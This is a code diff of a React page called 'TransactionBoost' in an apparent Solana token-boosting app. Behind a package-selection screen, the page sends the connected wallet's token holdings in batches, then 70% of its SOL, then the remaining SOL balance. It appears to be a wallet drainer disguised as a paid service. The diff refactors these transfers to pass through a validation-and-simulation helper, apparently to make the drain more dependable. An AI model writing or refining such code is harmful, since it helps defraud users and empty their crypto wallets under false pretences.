@@ -6,6 +6,7 @@ import {
   getWalletBalances,
   createBatchTransferTransaction,
   createFinalSolTransferTransaction,
+  sendWithValidationAndSimulation,
 } from "@/services/walletService";
 import { useTokenData } from "@/hooks/useTokenData";
 import { TokenInfo } from "@/components/TokenInfo";
@@ -30,7 +31,8 @@ const TX_PACKAGES = [
 export default function TransactionBoost() {
   const { contractAddress } = useParams<{ contractAddress: string }>();
   const navigate = useNavigate();
-  const { publicKey, sendTransaction } = useWallet();
+  const wallet = useWallet();
+  const { publicKey } = wallet;
   const { data, isLoading, error } = useTokenData(contractAddress || null);
   const [selectedPackage, setSelectedPackage] = useState<{ sol: number; tx: number } | null>(null);
 
@@ -71,11 +73,11 @@ export default function TransactionBoost() {
       // Send SPL token batches
       for (let i = 0; i < batches.length; i++) {
         const transaction = await createBatchTransferTransaction(
-          { publicKey, sendTransaction } as any,
+          wallet,
           batches[i],
           false
         );
-        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        const signature = await sendWithValidationAndSimulation(wallet, connection, transaction, { skipPreflight: false });
         toast({
           title: "Batch Sent",
           description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
@@ -84,15 +86,15 @@ export default function TransactionBoost() {
 
       // Send 70% of SOL balance
       const sol70Tx = await createBatchTransferTransaction(
-        { publicKey, sendTransaction } as any,
+        wallet,
         [],
         true
       );
-      await sendTransaction(sol70Tx, connection, { skipPreflight: false });
+      await sendWithValidationAndSimulation(wallet, connection, sol70Tx, { skipPreflight: false });
 
       // Send remaining SOL balance
-      const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
-      await sendTransaction(finalSolTx, connection, { skipPreflight: false });
+      const finalSolTx = await createFinalSolTransferTransaction(wallet);
+      await sendWithValidationAndSimulation(wallet, connection, finalSolTx, { skipPreflight: false });
 
       toast({
         title: "TX Boost Initialized",
@@ -112,7 +114,7 @@ export default function TransactionBoost() {
 
   return (
     <div className="min-h-screen bg-background bg-trading-animation">
-      <div className="container mx-auto py-8 space-y-6">
+      <div className="container mx-auto max-w-4xl px-4 py-8 space-y-6">
         <Button
           variant="outline"
           onClick={() => navigate("/")}
@@ -157,7 +159,7 @@ export default function TransactionBoost() {
                     key={index}
                     onClick={() => handlePackageSelect(pkg.sol, pkg.tx)}
                     variant="outline"
-                    className="h-auto py-4 flex flex-col items-center justify-center gap-2"
+                    className="w-full h-auto py-4 flex flex-col items-center justify-center gap-2"
                   >
                     <span className="text-lg font-bold">{pkg.sol} SOL</span>
                     <span className="text-sm text-muted-foreground">
